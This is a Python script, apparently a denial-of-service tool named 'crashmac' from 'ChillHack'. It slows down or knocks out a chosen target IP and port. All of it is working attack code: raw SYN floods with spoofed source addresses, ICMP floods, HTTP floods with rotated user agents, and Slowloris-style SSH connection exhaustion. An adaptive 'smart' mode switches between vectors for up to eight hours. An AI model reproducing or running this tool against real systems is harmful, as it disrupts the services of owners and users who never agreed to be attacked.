#!/usr/bin/env python3
import socket
import threading
import time
import sys
import os
import random
import logging
import signal
import argparse
from concurrent.futures import ThreadPoolExecutor
import struct
import urllib.request
import psutil
import asyncio
from logging.handlers import RotatingFileHandler

# Configuration
TARGET_HOST = None  # Set via command line
TARGET_PORT = None  # Set via command line for user-specified port
TARGET_PORTS_HTTP = [80, 443]  # HTTP/HTTPS ports (if open)
NUM_THREADS_SYN = 50  # Reduced for resource efficiency
NUM_THREADS_SSH = 10  # Reduced for resource efficiency
NUM_THREADS_HTTP = 10  # Reduced for resource efficiency
TIMEOUT = 30  # Timeout in seconds
EXPLOIT_DURATION = 28800  # Attack duration: 8 hours
ATTEMPTS_PER_THREAD = 2000  # Attempts per thread
RETRY_DELAY_MIN = 1.0  # Minimum retry delay (seconds)
RETRY_DELAY_MAX = 5.0  # Maximum retry delay (seconds)
MAX_LOG_SIZE = 5 * 1024 * 1024  # 5MB per log file
LOG_BACKUP_COUNT = 3  # Keep 3 backup logs

# Global counters (thread-safe)
stats_lock = threading.Lock()
stats = {
    "syn_attempts": 0,
    "ssh_attempts": 0,
    "http_attempts": 0,
    "syn_success": 0,
    "ssh_success": 0,
    "http_success": 0,
    "active_threads": 0,
    "start_time": time.time(),
    "last_mode": None,
    "mode_switch_count": 0,
    "http_response_time": 0.0
}

# Logging setup with rotation
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s [Thread-%(thread)d] %(levelname)s: %(message)s")
file_handler = RotatingFileHandler("crashmac_log.txt", maxBytes=MAX_LOG_SIZE, backupCount=LOG_BACKUP_COUNT)
file_handler.setFormatter(formatter)
stream_handler = logging.StreamHandler(sys.stdout)
stream_handler.setFormatter(formatter)
logger.addHandler(file_handler)
logger.addHandler(stream_handler)

def signal_handler(signum, frame):
    """Handle SIGINT for graceful shutdown"""
    logger.info("Received SIGINT, shutting down gracefully...")
    sys.exit(0)

def monitor_resources():
    """Monitor local CPU and memory usage"""
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent
    if cpu_usage > 90 or memory_usage > 90:
        logger.warning(f"High resource usage detected: CPU {cpu_usage}%, Memory {memory_usage}%")
        return False
    return True

def status_printer():
    """Display real-time attack status in terminal"""
    while True:
        try:
            with stats_lock:
                elapsed = time.time() - stats["start_time"]
                hours, rem = divmod(elapsed, 3600)
                minutes, seconds = divmod(rem, 60)
                target_status = "Unknown"
                ping_delay = "N/A"
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((TARGET_HOST, TARGET_PORT))
                    target_status = "Open" if result == 0 else "Closed/No Response"
                    sock.close()
                    start_time = time.time()
                    response = os.popen(f"ping -c 1 {TARGET_HOST}").read()
                    if "time=" in response:
                        ping_delay = float(response.split("time=")[1].split(" ")[0])
                except:
                    target_status = "Unreachable"

                print("\033[H\033[J")  # Clear screen
                print("===== macOS Slowdown Attack Status =====")
                print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
                print(f"Runtime: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}")
                print(f"Target Status: {target_status}")
                print(f"Network Delay: {ping_delay} ms (estimated)")
                print(f"HTTP Response Time: {stats['http_response_time']:.2f} ms")
                print(f"Active Threads: {stats['active_threads']}")
                print(f"CPU/RAM Pressure: {'High' if not monitor_resources() else 'Normal'}")
                print(f"Current Mode: {stats['last_mode'] or 'Not Set'}")
                print(f"Mode Switches: {stats['mode_switch_count']}")
                print("\nAttack Statistics:")
                print(f" SYN Flood: {stats['syn_attempts']} attempts, {stats['syn_success']} successes")
                print(f" SSH DoS: {stats['ssh_attempts']} attempts, {stats['ssh_success']} successes")
                print(f" HTTP Flood: {stats['http_attempts']} attempts, {stats['http_success']} successes")
                print("========================================")
            time.sleep(10)
        except KeyboardInterrupt:
            break

async def send_syn_flood(mode="loic"):
    """Perform SYN Flood with randomized TCP headers"""
    with stats_lock:
        stats["active_threads"] += 1
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        src_ip = f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"
        dst_ip = TARGET_HOST
        src_port = random.randint(1024, 65535)
        dst_port = TARGET_PORT

        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, 40, random.randint(0, 65535), 0, 64, socket.IPPROTO_TCP, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )

        tcp_header = struct.pack(
            '!HHLLBBHHH',
            src_port, dst_port, random.randint(0, 0xFFFFFFFF), 0, 5 << 4, 0x02, random.randint(4096, 65535), 0, 0
        )

        packet = ip_header + tcp_header
        for _ in range(ATTEMPTS_PER_THREAD):
            if not monitor_resources():
                logger.warning("Pausing SYN Flood due to high local resource usage")
                await asyncio.sleep(5)
                continue
            try:
                sock.sendto(packet, (dst_ip, 0))
                with stats_lock:
                    stats["syn_attempts"] += 1
                    stats["syn_success"] += 1
                logger.debug("Sent SYN packet")
                await asyncio.sleep(random.uniform(0.01 if mode == "loic" else 0.05, 0.05 if mode == "loic" else 0.1))
            except:
                break
        sock.close()
    except Exception as e:
        logger.error(f"SYN Flood error: {str(e)}")
    finally:
        with stats_lock:
            stats["active_threads"] -= 1

async def send_icmp_flood(mode="loic"):
    """Perform ICMP Flood with larger payload"""
    with stats_lock:
        stats["active_threads"] += 1
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_packet = struct.pack(
            '!BBHHH', 8, 0, 0, random.randint(0, 65535), 1
        ) + b"A" * (1500 if mode == "hoic" else 2000)  # Increased payload
        for _ in range(ATTEMPTS_PER_THREAD):
            if not monitor_resources():
                logger.warning("Pausing ICMP Flood due to high local resource usage")
                await asyncio.sleep(5)
                continue
            try:
                sock.sendto(icmp_packet, (TARGET_HOST, 0))
                with stats_lock:
                    stats["syn_attempts"] += 1
                    stats["syn_success"] += 1
                logger.debug("Sent ICMP packet")
                await asyncio.sleep(random.uniform(0.01 if mode == "loic" else 0.05, 0.05 if mode == "loic" else 0.1))
            except:
                break
        sock.close()
    except Exception as e:
        logger.error(f"ICMP Flood error: {str(e)}")
    finally:
        with stats_lock:
            stats["active_threads"] -= 1

async def send_http_flood(port, mode="hoic"):
    """Send varied HTTP requests to exhaust resources"""
    with stats_lock:
        stats["active_threads"] += 1
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]
    try:
        for _ in range(ATTEMPTS_PER_THREAD):
            if not monitor_resources():
                logger.warning("Pausing HTTP Flood due to high local resource usage")
                await asyncio.sleep(5)
                continue
            try:
                req = urllib.request.Request(f"http://{TARGET_HOST}:{port}/?q={random.randint(1, 10000)}")
                req.add_header("User-Agent", random.choice(user_agents))
                req.add_header("Accept", "text/html,application/xhtml+xml")
                start_time = time.time()
                urllib.request.urlopen(req, timeout=5)
                response_time = (time.time() - start_time) * 1000
                with stats_lock:
                    stats["http_attempts"] += 1
                    stats["http_success"] += 1
                    stats["http_response_time"] = response_time
                logger.debug(f"Sent HTTP request to port {port}")
                await asyncio.sleep(random.uniform(0.5 if mode == "hoic" else 0.1, 1.0 if mode == "hoic" else 0.2))
            except:
                with stats_lock:
                    stats["http_attempts"] += 1
                pass
    except Exception as e:
        logger.error(f"HTTP Flood error (port {port}): {str(e)}")
    finally:
        with stats_lock:
            stats["active_threads"] -= 1

async def send_partial_ssh_packet(sock, mode="hoic"):
    """Send realistic SSH handshake packets"""
    try:
        banner = b"SSH-2.0-OpenSSH_8.0\r\n"
        sock.send(banner)
        kexinit = (
            b"\x00\x00\x00\x00\x14" +  # Packet length + type
            b"\x00" * 16 +  # Random padding
            b"\x00\x00\x00\x0a" + b"ssh-rsa" +  # Key exchange algorithms
            b"\x00\x00\x00\x07" + b"ssh-rsa" +  # Host key algorithms
            b"\x00\x00\x00\x0f" + b"aes128-ctr"  # Encryption algorithms
        )
        sock.send(kexinit)
        await asyncio.sleep(random.uniform(1.0 if mode == "hoic" else 0.5, 2.0 if mode == "hoic" else 1.0))
    except socket.error as e:
        logger.debug(f"Failed to send SSH packet: {str(e)}")

async def ssh_dos(thread_id, mode="hoic"):
    """Perform enhanced Slowloris-style SSH DoS"""
    with stats_lock:
        stats["active_threads"] += 1
    sock = None
    for attempt in range(ATTEMPTS_PER_THREAD):
        if not monitor_resources():
            logger.warning("Pausing SSH DoS due to high local resource usage")
            await asyncio.sleep(5)
            continue
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((TARGET_HOST, TARGET_PORT))
            with stats_lock:
                stats["ssh_attempts"] += 1
                stats["ssh_success"] += 1
            logger.debug(f"SSH DoS attempt {attempt+1}/{ATTEMPTS_PER_THREAD}: TCP connection established")
            await send_partial_ssh_packet(sock, mode)
        except socket.error as e:
            with stats_lock:
                stats["ssh_attempts"] += 1
            err_msg = str(e)
            if "Broken pipe" in err_msg or "Connection reset by peer" in err_msg:
                logger.debug(f"SSH DoS attempt {attempt+1}: Connection failed - {err_msg}")
            else:
                logger.error(f"SSH DoS attempt {attempt+1}: Unexpected error - {err_msg}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
    with stats_lock:
        stats["active_threads"] -= 1

def check_resources():
    """Check and set file descriptor limit"""
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < 65535:
            resource.setrlimit(resource.RLIMIT_NOFILE, (65535, hard))
            logger.info("File descriptor limit raised to 65535")
        else:
            logger.info(f"File descriptor limit sufficient: {soft}")
    except Exception as e:
        logger.warning(f"Failed to raise file descriptor limit: {str(e)}")

def check_target():
    """Check target service status on specified port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.send(b"HEAD / HTTP/1.1\r\n\r\n")
        banner = sock.recv(1024).decode(errors='ignore')
        logger.info(f"Target Banner: {banner}")
        sock.close()
    except socket.error as e:
        logger.error(f"Failed to get target banner: {str(e)}")

def check_open_ports():
    """Check for other open ports (e.g., HTTP)"""
    open_ports = []
    for port in TARGET_PORTS_HTTP:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_HOST, port))
            if result == 0:
                open_ports.append(port)
                logger.info(f"Port {port} open, will start HTTP Flood")
            sock.close()
        except:
            pass
    return open_ports

def evaluate_attack_effectiveness():
    """Evaluate attack effectiveness based on multiple metrics"""
    with stats_lock:
        ping_delay = "N/A"
        try:
            response = os.popen(f"ping -c 1 {TARGET_HOST}").read()
            if "time=" in response:
                ping_delay = float(response.split("time=")[1].split(" ")[0])
            else:
                ping_delay = 999
        except:
            ping_delay = 999

        port_open = False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            port_open = sock.connect_ex((TARGET_HOST, TARGET_PORT)) == 0
            sock.close()
        except:
            pass

        http_response_time = stats["http_response_time"]
        current_mode = stats["last_mode"]
        if ping_delay > 100 or not port_open or http_response_time > 500:
            return "hoic" if current_mode != "hoic" else current_mode
        else:
            return "loic" if current_mode != "loic" else current_mode

def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="ChillHack's macOS Slowdown Exploit - Gradually slows down a target by exhausting network, CPU, and RAM.",
        usage="python crashmac.py --target-ip <IP> --target-port <PORT> [-L | -H | -S]"
    )
    parser.add_argument("--target-ip", required=True, help="Target IP address (e.g., 192.168.0.227)")
    parser.add_argument("--target-port", type=int, required=True, help="Target open port (e.g., 22)")
    parser.add_argument("-L", "--loic", action="store_true", help="Use LOIC-style high-frequency flood attack")
    parser.add_argument("-H", "--hoic", action="store_true", help="Use HOIC-style sustained multi-vector attack")
    parser.add_argument("-S", "--smart", action="store_true", help="Smart mode to dynamically select the best attack method")
    args = parser.parse_args()

    if sum([args.loic, args.hoic, args.smart]) > 1:
        parser.error("Choose only one mode: -L, -H, or -S")
    elif not any([args.loic, args.hoic, args.smart]):
        args.smart = True
    return args.target_ip, args.target_port, args.loic, args.hoic, args.smart

async def main():
    """Main attack logic"""
    global TARGET_HOST, TARGET_PORT
    TARGET_HOST, TARGET_PORT, loic_mode, hoic_mode, smart_mode = parse_args()
    attack_mode = "loic" if loic_mode else "hoic" if hoic_mode else "smart"
    with stats_lock:
        stats["last_mode"] = attack_mode

    logger.info(f"Starting attack on {TARGET_HOST}:{TARGET_PORT} in {attack_mode.upper()} mode")
    logger.info("Warning: This attack will gradually slow down the target. Press Ctrl+C to stop.")

    check_resources()
    check_target()
    open_ports = check_open_ports()

    status_thread = threading.Thread(target=status_printer, daemon=True)
    status_thread.start()

    signal.signal(signal.SIGINT, signal_handler)

    if attack_mode == "loic":
        logger.info("Starting LOIC-style high-frequency flood...")
        tasks = [send_syn_flood("loic") for _ in range(NUM_THREADS_SYN)] + \
                [send_icmp_flood("loic") for _ in range(10)]
        await asyncio.gather(*tasks)
    elif attack_mode == "hoic":
        logger.info("Starting HOIC-style sustained multi-vector attack...")
        tasks = [send_syn_flood("hoic") for _ in range(NUM_THREADS_SYN)] + \
                [send_icmp_flood("hoic") for _ in range(10)]
        if open_ports or TARGET_PORT in TARGET_PORTS_HTTP:
            ports = open_ports if open_ports else [TARGET_PORT]
            tasks += [send_http_flood(port, "hoic") for port in ports for _ in range(NUM_THREADS_HTTP // len(ports))]
        tasks += [ssh_dos(i, "hoic") for i in range(NUM_THREADS_SSH)]
        await asyncio.gather(*tasks)
    else:  # Smart mode
        logger.info("Starting SMART mode, dynamically selecting attack method...")
        while True:
            mode = evaluate_attack_effectiveness()
            with stats_lock:
                if stats["last_mode"] != mode:
                    stats["mode_switch_count"] += 1
                    stats["last_mode"] = mode
                    logger.info(f"Switching to {mode.upper()} mode")
            tasks = [send_syn_flood(mode) for _ in range(NUM_THREADS_SYN)] + \
                    [send_icmp_flood(mode) for _ in range(10)]
            if mode == "hoic" and (open_ports or TARGET_PORT in TARGET_PORTS_HTTP):
                ports = open_ports if open_ports else [TARGET_PORT]
                tasks += [send_http_flood(port, mode) for port in ports for _ in range(NUM_THREADS_HTTP // len(ports))]
                tasks += [ssh_dos(i, mode) for i in range(NUM_THREADS_SSH)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(60)  # Re-evaluate every 60 seconds

    try:
        await asyncio.sleep(EXPLOIT_DURATION)
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")

    logger.info("Attack ended. Check target status to confirm slowdown.")

if __name__ == "__main__":
    asyncio.run(main())
